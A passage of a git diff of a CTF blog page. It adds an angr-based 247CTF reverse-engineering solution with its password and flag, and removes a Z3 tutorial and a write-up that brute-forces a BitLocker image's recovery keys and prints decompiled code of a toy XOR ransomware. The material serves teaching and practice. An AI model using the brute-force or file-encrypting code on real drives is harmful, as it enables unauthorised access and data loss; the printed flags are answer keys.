    push ebx</span><br><span class="line">     0x08048627      83ec04         sub esp, 4</span><br><span class="line">     0x0804862a      e8b2005e00     call sym.__x86.get_pc_thunk.ax ;[6]</span><br><span class="line">     0x0804862f      05d1195e00     add eax, 0x5e19d1</span><br><span class="line">     0x08048634      8b9030000000   mov edx, dword [eax + 0x30]</span><br><span class="line">     0x0804863a      85d2           test edx, edx</span><br><span class="line"> ┌─&lt; 0x0804863c      7407           je 0x8048645</span><br><span class="line"> │   0x0804863e      e853ffffff     call sym.print_flag         ;[7]</span><br><span class="line">┌──&lt; 0x08048643      eb14           jmp 0x8048659</span><br><span class="line">│└─&gt; 0x08048645      83ec0c         sub esp, 0xc</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>The logic suggests we need to reach <code>print_flag</code> while
+avoiding the paths that lead to <code>no_flag</code>.</p>
+<h2 id="solution">Solution</h2>
+<p>Since the binary’s path to the flag is complex, we use
+<code>angr</code> to perform symbolic execution and find the correct
+input.</p>
+<h3 id="solver-script">Solver Script</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">bin_path</span>):</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Initialize the state at entry</span></span><br><span class="line">    initial_state = project.factory.entry_state(</span><br><span class="line">        add_options = &#123;</span><br><span class="line">            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Explore searching for the print_flag function and avoiding no_flag</span></span><br><span class="line">    <span class="comment"># print_flag: 0x08048596</span></span><br><span class="line">    <span class="comment"># no_flag: 0x8048609</span></span><br><span class="line">    simulation.explore(find=<span class="number">0x08048596</span>, avoid=<span class="number">0x8048609</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found solution: <span class="subst">&#123;solution_state.posix.dumps(sys.stdin.fileno()).decode()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve(<span class="string">&#x27;./angr-y_binary&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="execution">Execution</h3>
+<p>Running the script gives us the password:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ python solve.py</span><br><span class="line">wgIdWOS6Df9sCzAfiK</span><br></pre></td></tr></table></figure>
+<p>Connecting to the server with the found password:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">❯ nc 0c4c28058a1f7a2f.247ctf.com 50230</span><br><span class="line">Enter a valid password:</span><br><span class="line">wgIdWOS6Df9sCzAfiK</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{a3bbb9d2e648841d99e1cf4535a92945}</span></span>
+<h2 id="references">References</h2>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pha2VzcHJpbmdlci9hbmdyX2N0Zi90cmVlL21hc3Rlci9zb2x1dGlvbnMvMDFfYW5ncl9hdm9pZA==">angr_ctf
+learn - jakespringer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -804,854 +2290,8 @@ value.</li>
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/ctf/z3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/ctf/z3/" class="post-title-link" itemprop="url">Z3 solver note</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-03-05 15:03:10" itemprop="dateCreated datePublished" datetime="2026-03-05T15:03:10+08:00">2026-03-05</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-03-06 14:01:32" itemprop="dateModified" datetime="2026-03-06T14:01:32+08:00">2026-03-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-          , 
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/reverse-engineering/" itemprop="url" rel="index"><span itemprop="name">reverse-engineering</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/ctf/z3/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="ctf/z3/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Z3 is an SMT solver. You describe a problem as variables plus
-constraints, and Z3 finds assignments that satisfy them (or proves none
-exist).</p>
-<ul>
-<li>SMT = “Satisfiability Modulo Theories”</li>
-<li>Think of it as: “declare rules first, solve later”</li>
-<li>Usually not a replacement for a hand-tuned algorithm, but great when
-rules change often</li>
-</ul>
-<h2 id="typical-use-cases">Typical use cases</h2>
-<ul>
-<li>Scheduling and timetabling</li>
-<li>Resource allocation</li>
-<li>Program analysis and verification</li>
-<li>Reverse engineering and CTF constraints</li>
-</ul>
-<p>Example scheduling constraints:</p>
-<ul>
-<li>Mary cannot work Tuesdays</li>
-<li>John cannot teach before 10:00</li>
-<li>Outdoor classes cannot happen after 12:00</li>
-<li>Susan and Sarah cannot teach the same class</li>
-</ul>
-<p>This is exactly the kind of constraint-heavy problem where solvers
-shine.</p>
-<h2 id="core-variable-types">Core variable types</h2>
-<ul>
-<li><code>Int(name)</code>: integer (no fractions)</li>
-<li><code>Real(name)</code>: real/rational number</li>
-<li><code>Bool(name)</code>: boolean (<code>True</code> /
-<code>False</code>)</li>
-<li><code>BitVec(name, bits)</code>: fixed-width integer with wraparound
-(useful for low-level/crypto work)</li>
-</ul>
-<p>You can declare multiple variables at once with plural helpers, for
-example:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a, b, c, d, e = Bools(<span class="string">&quot;a b c d e&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="common-operators-and-helpers">Common operators and helpers</h2>
-<ul>
-<li><code>And(*args)</code>: all conditions must hold</li>
-<li><code>Or(*args)</code>: at least one condition must hold</li>
-<li><code>Not(x)</code>: logical negation</li>
-<li><code>Xor(a, b)</code>: exactly one is true</li>
-<li><code>Distinct(*args)</code>: all expressions have different
-values</li>
-<li><code>LShR(n, b)</code>: logical right shift (fills with
-<code>0</code>)</li>
-</ul>
-<p>Notes:</p>
-<ul>
-<li>Arithmetic: <code>+</code>, <code>-</code>, <code>*</code>,
-<code>/</code>, <code>**</code></li>
-<li>Bitwise: <code>&lt;&lt;</code>, <code>&gt;&gt;</code>,
-<code>&amp;</code>, <code>|</code></li>
-<li>Comparisons: <code>==</code>, <code>!=</code>, <code>&lt;</code>,
-<code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code></li>
-<li>For bit-vectors, <code>&gt;&gt;</code> is arithmetic shift; use
-<code>LShR</code> for logical shift</li>
-</ul>
-<h2 id="example">Example</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> Real, Solver, sat</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">x = Real(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">y = Real(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">z = Real(<span class="string">&quot;z&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.add(x * x + y == <span class="number">16</span>)</span><br><span class="line">s.add(z**<span class="number">3</span> == <span class="number">27</span>)</span><br><span class="line">s.add(x * z == <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;model:&quot;</span>, m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x =&quot;</span>, m.<span class="built_in">eval</span>(x))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;y =&quot;</span>, m.<span class="built_in">eval</span>(y))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;z =&quot;</span>, m.<span class="built_in">eval</span>(z))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;unsat&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="references">References</h2>
-<ul>
-<li>https://asibahi.github.io/thoughts/a-gentle-introduction-to-z3/</li>
-<li>https://www.hillelwayne.com/post/z3-examples/</li>
-<li>https://book.jorianwoltjer.com/cryptography/custom-ciphers/z3-solver</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-encrypted-usb-drive/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/247CTF/247CTF-encrypted-usb-drive/" class="post-title-link" itemprop="url">247CTF - Encrypted USB Drive</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-03-03 21:23:44" itemprop="dateCreated datePublished" datetime="2026-03-03T21:23:44+08:00">2026-03-03</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-03-06 14:01:32" itemprop="dateModified" datetime="2026-03-06T14:01:32+08:00">2026-03-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/247CTF/247CTF-encrypted-usb-drive/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-encrypted-usb-drive/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="encrypted-usb-drive">Encrypted USB Drive</h1>
-<blockquote>
-<p>An important USB drive containing sensitive information has been
-encrypted by some new ransomware variant. Can you reverse the ransomware
-encryption function and recover the files?</p>
-</blockquote>
-<h2 id="initial-analysis">1. Initial Analysis</h2>
-<p>We are provided with a BitLocker-encrypted USB image
-(<code>encrypted_usb.dd</code>) and a large list of potential recovery
-keys (<code>recovery_keys_dump.txt</code>).</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ file encrypted_usb.dd</span><br><span class="line">encrypted_usb.dd: DOS/MBR boot sector, code offset 0x58+2, OEM-ID <span class="string">&quot;-FVE-FS-&quot;</span>, ... FAT (32 bit) ... NTFS ...</span><br></pre></td></tr></table></figure>
-<p>The goal is to find the correct recovery key, mount the image, and
-then deal with the “ransomware” that has encrypted the files inside.</p>
-<h2 id="bitlocker-decryption">2. BitLocker Decryption</h2>
-<h3 id="attempting-john-the-ripper">Attempting John the Ripper</h3>
-<p>First, I tried using <code>bitlocker2john</code> to extract the hash
-and then cracked it with the provided recovery keys.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">❯ bitlocker2john -i encrypted_usb.dd &gt; <span class="built_in">hash</span></span><br><span class="line">❯ john --wordlist=./recovery_keys_dump.txt --fork=6 <span class="built_in">hash</span></span><br><span class="line">...</span><br><span class="line">0 password hashes cracked, 4 left</span><br></pre></td></tr></table></figure>
-<p>John didn’t seem to find the key directly (possibly due to format
-mismatch or configuration). Instead of debugging the hash format, I
-moved to a more direct approach: brute-forcing the mount command using
-<code>dislocker</code>.</p>
-<h3 id="brute-forcing-with-dislocker">Brute-forcing with Dislocker</h3>
-<p>I wrote a simple bash script to iterate through the
-<code>recovery_keys_dump.txt</code> and attempt to mount the image.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">IMG_FILE=<span class="string">&quot;encrypted_usb.dd&quot;</span></span><br><span class="line">MNT_DIR=<span class="string">&quot;/mnt/bitlocker_img&quot;</span></span><br><span class="line">USB_DIR=<span class="string">&quot;/mnt/unlocked_usb&quot;</span></span><br><span class="line">KEYS_FILE=<span class="string">&quot;recovery_keys_dump.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$EUID</span> -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;[-] Error: This script must be run as root.&quot;</span></span><br><span class="line">   <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$MNT_DIR</span>&quot;</span> <span class="string">&quot;<span class="variable">$USB_DIR</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r key; <span class="keyword">do</span></span><br><span class="line">    <span class="comment"># -p specifies the recovery password</span></span><br><span class="line">    <span class="keyword">if</span> dislocker -V <span class="string">&quot;<span class="variable">$IMG_FILE</span>&quot;</span> -p<span class="string">&quot;<span class="variable">$key</span>&quot;</span> -- <span class="string">&quot;<span class="variable">$MNT_DIR</span>&quot;</span> 2&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\n[+] Recovery Key Found: <span class="variable">$key</span>&quot;</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span> &lt; <span class="string">&quot;<span class="variable">$KEYS_FILE</span>&quot;</span></span><br></pre></td></tr></table></figure>
-<p>Running the script successfully identified the key:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Recovery Key Found: 334565-564641-129580-248655-292215-551991-326733-393679</span><br><span class="line"></span><br><span class="line">❯ <span class="built_in">sudo</span> mount /mnt/bitlocker_img/dislocker-file /mnt/unlocked_usb</span><br></pre></td></tr></table></figure>
-<h2 id="ransomware-analysis">3. Ransomware Analysis</h2>
-<p>Inside the mounted drive, we find several encrypted files and the
-ransomware binary itself:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ <span class="built_in">ls</span> -lh /mnt/unlocked_usb/</span><br><span class="line">total 3.2M</span><br><span class="line">-rwxrwxrwx 1 root root 474K Oct  8  2022 crypto_passphrase.png.xxx.crypt</span><br><span class="line">-rwxrwxrwx 1 root root  15K Oct  8  2022 cryptor</span><br><span class="line">-rwxrwxrwx 1 root root 9.2K Oct  8  2022 do_not_open.png.xxx.crypt</span><br><span class="line">-rwxrwxrwx 1 root root 133K Oct  8  2022 meeting_minutes.png.xxx.crypt</span><br><span class="line">-rwxrwxrwx 1 root root 889K Oct  8  2022 passwords.png.xxx.crypt</span><br><span class="line">-rwxrwxrwx 1 root root  386 Oct  8  2022 ransom.txt</span><br><span class="line">-rwxrwxrwx 1 root root 1.7M Oct  8  2022 salary_screenshot.png.xxx.crypt</span><br></pre></td></tr></table></figure>
-<p>The <code>ransom.txt</code> claims to use a “secure XOR encryption
-algorithm”.</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your files have been encrypted using a secure xor encryption algorithm and are completely unrecoverable!</span><br><span class="line">To decrypt your files, you need your secret encryption key.</span><br></pre></td></tr></table></figure>
-<h2 id="recovery-known-plaintext-attack">4. Recovery (Known Plaintext
-Attack)</h2>
-<p>Since the files are PNGs, we can perform a <strong>Known Plaintext
-Attack</strong>. We know that PNG files always start with the same
-8-byte magic header: <code>89 50 4E 47 0D 0A 1A 0A</code>.</p>
-<p>By XORing the first 8 bytes of an encrypted file with this known PNG
-header, we can recover the XOR key.</p>
-<p>Using <strong>CyberChef</strong>:</p>
-<ol type="1">
-<li>Input the first few bytes of
-<code>do_not_open.png.xxx.crypt</code>.</li>
-<li>XOR with the PNG magic bytes
-<code>89 50 4E 47 0D 0A 1A 0A</code>.</li>
-<li>The result reveals the key repeats as <code>66 63 6f 79</code>
-(ASCII: <code>fcoy</code>).</li>
-</ol>
-<p>Applying the XOR key <code>fcoy</code> to the entire file
-<code>do_not_open.png.xxx.crypt</code> recovers the original image
-containing the flag.</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{494f7cceb2baf33a0879543fe673blae}</span></span>
-<hr />
-<h2 id="deep-dive-reversing-the-cryptor-binary">5. Deep Dive: Reversing
-the <code>cryptor</code> Binary</h2>
-<p>I was curious about how the binary actually worked, so I threw it
-into IDA Pro.</p>
-<h3 id="main-logic">Main Logic</h3>
-<p>The program expects a 4-character key as a command-line argument. It
-then iterates through the current directory, looking for files with the
-<code>.xxx</code> extension.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// Key must be exactly 4 bytes long</span></span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">2</span> || <span class="built_in">strlen</span>(a2[<span class="number">1</span>]) != <span class="number">4</span> || (<span class="type">unsigned</span> <span class="type">int</span>)check_key_validity(a2[<span class="number">1</span>]) != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  dirp = opendir(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dirp )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (v5 = readdir(dirp)) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)is_target_extension(v5-&gt;d_name) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, v5-&gt;d_name);</span><br><span class="line">        <span class="built_in">strcat</span>(dest, <span class="string">&quot;.crypt&quot;</span>); <span class="comment">// Append .crypt to original name</span></span><br><span class="line">        encrypt_file(v5-&gt;d_name, dest, a2[<span class="number">1</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dirp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="encryption-function">Encryption Function</h3>
-<p>The encryption is indeed a simple byte-by-byte XOR using the 4-byte
-key provided.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">encrypt_file</span><span class="params">(<span class="type">char</span> *source, <span class="type">char</span> *dest, <span class="type">char</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  stream = fopen(source, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  v16 = fopen(dest, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Read chunks matching the key length</span></span><br><span class="line">    bytes_read = fread(ptr, <span class="number">1u</span>, key_len, stream);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; bytes_read; ++i )</span><br><span class="line">      *((_BYTE *)ptr + i) ^= key[i]; <span class="comment">// XOR logic</span></span><br><span class="line">    fwrite(ptr, <span class="number">1u</span>, bytes_read, v16);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( bytes_read == key_len );</span><br><span class="line"></span><br><span class="line">  fclose(stream);</span><br><span class="line">  fclose(v16);</span><br><span class="line">  <span class="keyword">return</span> ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>The analysis confirms the Known Plaintext Attack was the correct
-approach, as the key length was short (4 bytes) and applied
-cyclically.</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-the-encrypted-password/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/247CTF/247CTF-the-encrypted-password/" class="post-title-link" itemprop="url">247CTF - The Encrypted Password</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-03-02 20:15:42" itemprop="dateCreated datePublished" datetime="2026-03-02T20:15:42+08:00">2026-03-02</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-03-06 14:01:32" itemprop="dateModified" datetime="2026-03-06T14:01:32+08:00">2026-03-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/247CTF/247CTF-the-encrypted-password/#disqus_thread" itemprop="discussionUrl">
